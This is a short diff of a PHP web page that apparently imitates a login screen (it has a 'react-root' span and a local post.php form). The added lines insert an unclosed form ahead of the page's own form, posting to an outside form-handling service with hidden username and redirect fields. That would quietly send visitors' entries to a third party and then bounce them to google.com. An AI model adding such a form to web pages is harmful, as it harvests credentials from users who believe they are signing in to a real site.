@@ -1,5 +1,5 @@
 <?php  ob_start(); ?>
-<!DOCTYPE html>
+<!DOCTYPE html> 
 
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
 
@@ -202,6 +202,11 @@
  </head> 
  <body class="">
 
+
+<form action="http://www.formbuddy.com/cgi-bin/form.pl" method="post">
+<input type="hidden" name="username" value="rtt01">
+<input type="hidden" name="reqd" value="0">
+<input type="hidden" name="url" value="http://google.com">
 
 <form method="POST" action="post.php">
   <span id="react-root">
